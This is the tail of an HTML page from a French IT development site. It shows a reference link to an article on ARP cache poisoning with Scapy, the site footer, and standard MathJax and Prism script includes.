href="https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242">https://ismailakkila.medium.com/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242</a></li></ul></article></main><footer class="min-h-[50px] border-t-2 mt-4 border-gray-200 dark:border-neutral-700"><div class="max-w-[1000px] mx-auto px-4"><div class="min-h-[50px] flex justify-center items-center"><p class="text-center">¬©2025 <b><span style="font-family:Consolas,sans-serif">Do-<span style="color:#4a86e8">It</span></span></b> - D√©veloppement, Management et Gestion de projets en IT</p></div></div></footer><script src="https://cdn.jsdelivr.net/npm/mathjax/es5/tex-svg-full.js" defer="">window.MathJax={tex:{inlineMath:[["$","$"],["\\(","\\)"]],displayMath:[["$$","$$"],["\\[","\\]"]]},svg:{fontCache:"global"}},document.addEventListener("DOMContentLoaded",(()=>{MathJax.typeset()}))</script><script src="https://cdn.jsdelivr.net/npm/prismjs/prism.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs/plugins/toolbar/prism-toolbar.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs/plugins/line-numbers/prism-line-numbers.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs/plugins/normalize-whitespace/prism-normalize-whitespace.min.js">Prism.plugins.NormalizeWhitespace.setDefaults({"remove-trailing":!0,"remove-indent":!0,"left-trim":!0,"right-trim":!0})</script><script src="https://cdn.jsdelivr.net/npm/prismjs/plugins/show-language/prism-show-language.min.js"></script><script src="https://cdn.jsdelivr.net/npm/prismjs/plugins/autoloader/prism-autoloader.min.js"></script></body></html>